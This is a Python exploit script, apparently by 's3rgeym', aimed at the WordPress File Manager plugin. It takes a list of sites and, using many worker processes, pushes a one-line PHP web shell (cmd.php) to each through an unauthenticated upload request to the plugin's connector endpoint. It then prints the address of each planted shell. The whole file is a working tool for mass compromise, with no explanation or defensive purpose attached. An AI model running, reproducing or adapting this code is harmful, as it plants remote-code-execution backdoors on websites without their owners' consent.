#!/usr/bin/env python
"""Wordpress File Manager exploit by s3rgeym"""
import argparse
import logging
import multiprocessing
import queue
import sys
from typing import Any, Dict, Iterable, List, Tuple
from urllib.parse import urljoin

# aiohttp оказался в очередной раз глючным тормозным говном
import requests

__version__ = '0.1.0'


def normalize_url(url: str) -> str:
    return url if '://' in url else 'http://' + url


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        '-i',
        '--input',
        default=sys.stdin,
        help='input file',
        type=argparse.FileType('r'),
    )

    parser.add_argument(
        '-t',
        '--timeout',
        default=10.0,
        help='connection + request timeout',
        type=float,
    )

    parser.add_argument(
        '-v',
        '--verbosity',
        action='count',
        default=0,
        help='increase output verbosity: 0 - warning, 1 - info, 2 - debug',
    )

    parser.add_argument(
        '--version', action='version', version=f'v{__version__}'
    )

    parser.add_argument(
        '-w',
        '--workers',
        default=10,
        help='num of workers',
        type=int,
    )

    args: argparse.Namespace = parser.parse_args()

    levels: List[int] = [logging.WARNING, logging.INFO, logging.DEBUG]
    level: int = levels[min(args.verbosity, len(levels) - 1)]
    multiprocessing.log_to_stderr(level)

    sites: Iterable[str] = map(
        normalize_url, filter(None, map(str.strip, args.input.readlines()))
    )

    q = multiprocessing.JoinableQueue()
    stopped = multiprocessing.Event()

    for site in sites:
        q.put_nowait(site)

    workers: List[Worker] = [
        Worker(q, stopped, args.timeout) for _ in range(args.workers)
    ]

    q.join()
    stopped.set()

    for w in workers:
        w.join()


class Worker(multiprocessing.Process):
    def __init__(
        self,
        q: multiprocessing.JoinableQueue,
        stopped: multiprocessing.Event,
        timeout: float,
    ) -> None:
        super().__init__()
        self.q = q
        self.stopped = stopped
        self.timeout = timeout
        self.lock = multiprocessing.Lock()
        self.log: logging.Logger = multiprocessing.get_logger()
        self.daemon = True
        self.start()

    def run(self) -> None:
        session: requests.Session = requests.session()
        session.headers = {
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
        }
        while not self.stopped.is_set():
            try:
                site: str = self.q.get(timeout=1.0)
            except queue.Empty:
                continue
            try:
                url: str = urljoin(
                    site,
                    '/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',
                )
                data: Dict[str, str] = {
                    'reqid': '1744f7298611ba',
                    'cmd': 'upload',
                    'target': 'l1_Lw',
                    'mtime[]': '1489007554',
                }
                files: Dict[str, Tuple[str, str, str]] = {
                    'upload[]': (
                        'cmd.php',
                        '<?php extract($_REQUEST); @$a($b);',
                        'application/php',
                    )
                }
                self.log.debug(f'check {url=}')
                r: requests.Response = session.post(
                    url, data=data, files=files, timeout=self.timeout
                )
                r.raise_for_status()
                self.log.debug(r.text[:255])
                with self.lock:
                    print(
                        urljoin(
                            site,
                            '/wp-content/plugins/wp-file-manager/lib/files/cmd.php',
                        ),
                        flush=True,
                    )
            except Exception as e:
                self.log.error(e)
            finally:
                self.q.task_done()


if __name__ == '__main__':
    sys.exit(main())
